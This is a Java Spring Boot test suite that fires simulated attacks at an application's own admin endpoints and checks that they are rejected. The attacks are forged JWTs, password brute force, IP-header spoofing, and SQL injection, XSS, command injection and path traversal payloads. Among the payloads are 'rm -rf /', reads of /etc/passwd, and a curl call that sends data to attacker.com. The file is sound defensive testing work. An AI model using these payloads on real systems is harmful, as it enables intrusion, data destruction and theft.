package com.storesight.backend.security;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.storesight.backend.BaseIntegrationTest;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureWebMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

/**
 * Comprehensive penetration testing suite that simulates real-world attack scenarios to validate
 * the security controls and defensive mechanisms of the application
 */
@SpringBootTest
@AutoConfigureWebMvc
@ActiveProfiles("test")
public class PenetrationTestSuite extends BaseIntegrationTest {

  @Autowired private MockMvc mockMvc;

  private final ObjectMapper objectMapper = new ObjectMapper();
  private final ExecutorService executorService = Executors.newFixedThreadPool(10);

  @BeforeEach
  void setUp() {
    // Setup for penetration tests
  }

  @Nested
  @DisplayName("Authentication Bypass Penetration Tests")
  class AuthenticationBypassTests {

    @Test
    @DisplayName("JWT Token Manipulation Attack")
    void jwtTokenManipulationAttack() throws Exception {
      // Test various JWT manipulation techniques
      String[] maliciousTokens = {
        // None algorithm attack
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIn0.",

        // Algorithm confusion attack (HS256 vs RS256)
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.invalid",

        // Modified payload
        "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJST0xFX0FETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.invalid",

        // Empty signature
        "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIn0.",

        // Malformed token
        "invalid.token.format"
      };

      for (String maliciousToken : maliciousTokens) {
        MvcResult result =
            mockMvc
                .perform(
                    get("/api/admin/status").header("Authorization", "Bearer " + maliciousToken))
                .andExpect(status().isUnauthorized())
                .andReturn();

        String response = result.getResponse().getContentAsString();
        assertFalse(
            response.contains("authenticated"),
            "Token manipulation should not grant access: " + maliciousToken);
      }
    }

    @Test
    @DisplayName("Brute Force Attack Simulation")
    void bruteForceAttackSimulation() throws Exception {
      String[] commonPasswords = {
        "admin", "password", "123456", "admin123", "root",
        "password123", "admin@123", "qwerty", "letmein", "welcome"
      };

      String clientIp = "192.168.1.100";
      int blockedAttempts = 0;

      for (String password : commonPasswords) {
        String loginPayload =
            objectMapper.writeValueAsString(Map.of("username", "admin", "password", password));

        MvcResult result =
            mockMvc
                .perform(
                    post("/api/admin/login")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(loginPayload)
                        .header("X-Forwarded-For", clientIp))
                .andReturn();

        if (result.getResponse().getStatus() == 429) {
          blockedAttempts++;
        }
      }

      assertTrue(blockedAttempts > 0, "Brute force attack should be rate limited");
    }

    @Test
    @DisplayName("Session Fixation Attack")
    void sessionFixationAttack() throws Exception {
      // Attempt to fix a session ID and use it after authentication
      String fixedSessionId = "ATTACKER_CONTROLLED_SESSION_ID";

      mockMvc
          .perform(
              get("/api/admin/status")
                  .cookie(new jakarta.servlet.http.Cookie("admin_token", fixedSessionId)))
          .andExpect(status().isUnauthorized());

      // Even after a hypothetical login, the fixed session should not be valid
      mockMvc
          .perform(
              get("/api/admin/status")
                  .cookie(new jakarta.servlet.http.Cookie("admin_token", fixedSessionId)))
          .andExpect(status().isUnauthorized());
    }

    @Test
    @DisplayName("Concurrent Login Attack")
    void concurrentLoginAttack() throws Exception {
      // Simulate multiple concurrent login attempts from different IPs
      List<CompletableFuture<Integer>> futures =
          Arrays.asList(
              CompletableFuture.supplyAsync(() -> performLoginAttempt("192.168.1.101")),
              CompletableFuture.supplyAsync(() -> performLoginAttempt("192.168.1.102")),
              CompletableFuture.supplyAsync(() -> performLoginAttempt("192.168.1.103")),
              CompletableFuture.supplyAsync(() -> performLoginAttempt("192.168.1.104")),
              CompletableFuture.supplyAsync(() -> performLoginAttempt("192.168.1.105")));

      // Wait for all attempts to complete
      CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();

      // Verify that rate limiting is applied across concurrent requests
      long rateLimitedRequests =
          futures.stream()
              .mapToInt(CompletableFuture::join)
              .filter(status -> status == 429)
              .count();

      assertTrue(rateLimitedRequests > 0, "Concurrent attacks should trigger rate limiting");
    }

    private Integer performLoginAttempt(String clientIp) {
      try {
        String loginPayload =
            objectMapper.writeValueAsString(
                Map.of(
                    "username", "admin",
                    "password", "wrongpassword"));

        MvcResult result =
            mockMvc
                .perform(
                    post("/api/admin/login")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(loginPayload)
                        .header("X-Forwarded-For", clientIp))
                .andReturn();

        return result.getResponse().getStatus();
      } catch (Exception e) {
        return 500;
      }
    }
  }

  @Nested
  @DisplayName("Session Hijacking Penetration Tests")
  class SessionHijackingTests {

    @Test
    @DisplayName("Session Token Theft Simulation")
    void sessionTokenTheftSimulation() throws Exception {
      // Simulate stolen session token usage
      String stolenToken =
          "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.fake_signature";

      mockMvc
          .perform(get("/api/admin/status").header("Authorization", "Bearer " + stolenToken))
          .andExpect(status().isUnauthorized());
    }

    @Test
    @DisplayName("IP Address Spoofing Attack")
    void ipAddressSpoofingAttack() throws Exception {
      // Simulate IP spoofing attempts
      String[] spoofedIps = {
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "255.255.255.255",
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1"
      };

      for (String spoofedIp : spoofedIps) {
        mockMvc
            .perform(
                get("/api/admin/status")
                    .header("X-Forwarded-For", spoofedIp)
                    .header("X-Real-IP", spoofedIp))
            .andExpect(status().isUnauthorized());
      }
    }

    @Test
    @DisplayName("User Agent Manipulation Attack")
    void userAgentManipulationAttack() throws Exception {
      String[] maliciousUserAgents = {
        // SQL injection in user agent
        "Mozilla/5.0'; DROP TABLE users; --",

        // XSS in user agent
        "Mozilla/5.0<script>alert('xss')</script>",

        // Command injection
        "Mozilla/5.0; rm -rf /",

        // Path traversal
        "Mozilla/5.0../../../etc/passwd",

        // Extremely long user agent
        "Mozilla/5.0" + "A".repeat(10000)
      };

      for (String maliciousUA : maliciousUserAgents) {
        mockMvc
            .perform(get("/api/admin/status").header("User-Agent", maliciousUA))
            .andExpect(status().isUnauthorized()); // Should still require auth
      }
    }
  }

  @Nested
  @DisplayName("Injection Attack Penetration Tests")
  class InjectionAttackTests {

    @Test
    @DisplayName("SQL Injection Attack Vectors")
    void sqlInjectionAttackVectors() throws Exception {
      String[] sqlInjectionPayloads = {
        // Classic SQL injection
        "'; DROP TABLE shops; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin'/*",

        // Blind SQL injection
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND SLEEP(5) --",

        // Second-order SQL injection
        "'; INSERT INTO users VALUES('attacker', 'password'); --",

        // NoSQL injection (if applicable)
        "'; return true; //",
        "' || '1'=='1",

        // Time-based SQL injection
        "'; WAITFOR DELAY '00:00:05' --"
      };

      for (String payload : sqlInjectionPayloads) {
        // Test in various parameters
        mockMvc
            .perform(get("/api/admin/status").param("shop", payload))
            .andExpect(status().isBadRequest());

        mockMvc
            .perform(get("/api/admin/status").param("id", payload))
            .andExpect(status().isBadRequest());
      }
    }

    @Test
    @DisplayName("Cross-Site Scripting (XSS) Attack Vectors")
    void xssAttackVectors() throws Exception {
      String[] xssPayloads = {
        // Basic XSS
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",

        // Event handler XSS
        "onmouseover=alert('xss')",
        "onfocus=alert('xss')",
        "onload=alert('xss')",

        // JavaScript protocol
        "javascript:alert('xss')",
        "vbscript:alert('xss')",

        // Encoded XSS
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        "&#60;script&#62;alert('xss')&#60;/script&#62;",

        // DOM-based XSS
        "<iframe src=javascript:alert('xss')>",
        "<object data=javascript:alert('xss')>",

        // Filter bypass attempts
        "<ScRiPt>alert('xss')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<<SCRIPT>alert('xss');//<</SCRIPT>"
      };

      for (String payload : xssPayloads) {
        mockMvc
            .perform(get("/api/admin/status").param("message", payload))
            .andExpect(status().isBadRequest());
      }
    }

    @Test
    @DisplayName("Command Injection Attack Vectors")
    void commandInjectionAttackVectors() throws Exception {
      String[] commandInjectionPayloads = {
        // Unix command injection
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "; rm -rf /",

        // Windows command injection
        "& dir",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "&& net user",

        // Blind command injection
        "; sleep 10",
        "| ping -c 10 127.0.0.1",
        "&& curl http://attacker.com/steal?data=",

        // Time-based detection
        "; sleep 5 && echo 'injected'",
        "| timeout 5"
      };

      for (String payload : commandInjectionPayloads) {
        mockMvc
            .perform(get("/api/admin/status").param("command", payload))
            .andExpect(status().isBadRequest());
      }
    }
  }

  @Nested
  @DisplayName("Authorization Bypass Penetration Tests")
  class AuthorizationBypassTests {

    @Test
    @DisplayName("Privilege Escalation Attack")
    void privilegeEscalationAttack() throws Exception {
      // Attempt to access admin endpoints without proper authorization
      String[] adminEndpoints = {
        "/api/admin/secrets",
        "/api/admin/emergency/comprehensive-cleanup",
        "/api/admin/emergency/kill-long-running-queries",
        "/api/admin/session-security/metrics"
      };

      for (String endpoint : adminEndpoints) {
        mockMvc.perform(get(endpoint)).andExpect(status().isUnauthorized());

        mockMvc
            .perform(post(endpoint).contentType(MediaType.APPLICATION_JSON).content("{}"))
            .andExpect(status().isUnauthorized());
      }
    }

    @Test
    @DisplayName("Path Traversal Attack")
    void pathTraversalAttack() throws Exception {
      String[] pathTraversalPayloads = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
      };

      for (String payload : pathTraversalPayloads) {
        mockMvc
            .perform(get("/api/admin/status").param("file", payload))
            .andExpect(status().isBadRequest());
      }
    }

    @Test
    @DisplayName("HTTP Method Override Attack")
    void httpMethodOverrideAttack() throws Exception {
      // Attempt to bypass method restrictions using HTTP method override
      String[] methodOverrides = {"PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"};

      for (String method : methodOverrides) {
        mockMvc
            .perform(get("/api/admin/secrets").header("X-HTTP-Method-Override", method))
            .andExpect(status().isUnauthorized());

        mockMvc
            .perform(
                post("/api/admin/secrets")
                    .header("X-HTTP-Method-Override", method)
                    .contentType(MediaType.APPLICATION_JSON)
                    .content("{}"))
            .andExpect(status().isUnauthorized());
      }
    }
  }

  @Nested
  @DisplayName("Rate Limiting Bypass Penetration Tests")
  class RateLimitingBypassTests {

    @Test
    @DisplayName("IP Rotation Attack")
    void ipRotationAttack() throws Exception {
      // Simulate attack using multiple IP addresses to bypass rate limiting
      String[] attackerIps = {
        "192.168.1.100", "192.168.1.101", "192.168.1.102",
        "192.168.1.103", "192.168.1.104", "10.0.0.100",
        "172.16.0.100", "203.0.113.100"
      };

      for (String ip : attackerIps) {
        String loginPayload =
            objectMapper.writeValueAsString(
                Map.of(
                    "username", "admin",
                    "password", "wrongpassword"));

        // Each IP should be rate limited independently
        for (int i = 0; i < 10; i++) {
          MvcResult result =
              mockMvc
                  .perform(
                      post("/api/admin/login")
                          .contentType(MediaType.APPLICATION_JSON)
                          .content(loginPayload)
                          .header("X-Forwarded-For", ip))
                  .andReturn();

          // Should eventually be rate limited per IP
          if (i > 5) {
            assertTrue(
                result.getResponse().getStatus() == 429 || result.getResponse().getStatus() == 401,
                "Should be rate limited or unauthorized for IP: " + ip);
          }
        }
      }
    }

    @Test
    @DisplayName("Header Manipulation Rate Limit Bypass")
    void headerManipulationRateLimitBypass() throws Exception {
      String baseIp = "192.168.1.200";

      // Attempt to bypass rate limiting by manipulating headers
      String[][] headerCombinations = {
        {"X-Forwarded-For", baseIp + ", 192.168.1.201"},
        {"X-Real-IP", "192.168.1.202"},
        {"X-Originating-IP", "192.168.1.203"},
        {"X-Remote-IP", "192.168.1.204"},
        {"X-Client-IP", "192.168.1.205"}
      };

      String loginPayload =
          objectMapper.writeValueAsString(
              Map.of(
                  "username", "admin",
                  "password", "wrongpassword"));

      for (String[] headers : headerCombinations) {
        for (int i = 0; i < 8; i++) {
          MvcResult result =
              mockMvc
                  .perform(
                      post("/api/admin/login")
                          .contentType(MediaType.APPLICATION_JSON)
                          .content(loginPayload)
                          .header(headers[0], headers[1]))
                  .andReturn();

          // Rate limiting should still apply regardless of header manipulation
          if (i > 5) {
            assertTrue(
                result.getResponse().getStatus() == 429 || result.getResponse().getStatus() == 401,
                "Rate limiting should not be bypassed with header: " + headers[0]);
          }
        }
      }
    }
  }

  @Nested
  @DisplayName("Information Disclosure Penetration Tests")
  class InformationDisclosureTests {

    @Test
    @DisplayName("Error Message Information Disclosure")
    void errorMessageInformationDisclosure() throws Exception {
      // Test that error messages don't reveal sensitive information
      String[] errorTriggers = {
        "/api/admin/nonexistent",
        "/api/admin/secrets/nonexistent",
        "/api/admin/emergency/invalid-operation"
      };

      for (String endpoint : errorTriggers) {
        MvcResult result = mockMvc.perform(get(endpoint)).andReturn();

        String response = result.getResponse().getContentAsString();

        // Check that response doesn't contain sensitive information
        assertFalse(response.contains("Exception"), "Error should not contain exception details");
        assertFalse(response.contains("Stack"), "Error should not contain stack traces");
        assertFalse(response.contains("java."), "Error should not contain Java class names");
        assertFalse(
            response.contains("org.springframework"), "Error should not contain framework details");
        assertFalse(response.contains("database"), "Error should not contain database details");
        assertFalse(response.contains("redis"), "Error should not contain Redis details");
      }
    }

    @Test
    @DisplayName("HTTP Method Enumeration")
    void httpMethodEnumeration() throws Exception {
      // Test that unsupported methods don't reveal information
      String[] httpMethods = {"TRACE", "OPTIONS", "HEAD", "CONNECT", "PATCH"};

      for (String method : httpMethods) {
        MvcResult result =
            mockMvc
                .perform(
                    request(
                        org.springframework.http.HttpMethod.valueOf(method), "/api/admin/status"))
                .andReturn();

        // Should not reveal allowed methods or other sensitive information
        String response = result.getResponse().getContentAsString();
        assertFalse(response.contains("Allow:"), "Should not reveal allowed methods");
      }
    }
  }

  @Nested
  @DisplayName("Business Logic Attack Tests")
  class BusinessLogicAttackTests {

    @Test
    @DisplayName("Race Condition Attack")
    void raceConditionAttack() throws Exception {
      // Simulate concurrent requests to test for race conditions
      List<CompletableFuture<Void>> futures =
          Arrays.asList(
              CompletableFuture.runAsync(() -> performConcurrentRequest("/api/admin/status")),
              CompletableFuture.runAsync(() -> performConcurrentRequest("/api/admin/status")),
              CompletableFuture.runAsync(() -> performConcurrentRequest("/api/admin/status")),
              CompletableFuture.runAsync(() -> performConcurrentRequest("/api/admin/status")),
              CompletableFuture.runAsync(() -> performConcurrentRequest("/api/admin/status")));

      // Wait for all requests to complete
      CompletableFuture.allOf(futures.toArray(new CompletableFuture[0])).join();

      // If we reach here without exceptions, race condition handling is working
      assertTrue(true, "Concurrent requests handled without race conditions");
    }

    private void performConcurrentRequest(String endpoint) {
      try {
        mockMvc.perform(get(endpoint)).andReturn();
      } catch (Exception e) {
        // Expected for unauthorized requests
      }
    }

    @Test
    @DisplayName("Resource Exhaustion Attack")
    void resourceExhaustionAttack() throws Exception {
      // Test that the application handles resource exhaustion gracefully
      ExecutorService attackExecutor = Executors.newFixedThreadPool(50);

      try {
        // Submit many concurrent requests
        for (int i = 0; i < 100; i++) {
          attackExecutor.submit(
              () -> {
                try {
                  mockMvc.perform(get("/api/health")).andReturn();
                } catch (Exception e) {
                  // Expected under load
                }
              });
        }

        // Wait for completion
        attackExecutor.shutdown();
        assertTrue(
            attackExecutor.awaitTermination(30, TimeUnit.SECONDS),
            "Resource exhaustion test should complete within timeout");

      } finally {
        if (!attackExecutor.isShutdown()) {
          attackExecutor.shutdownNow();
        }
      }
    }
  }
}
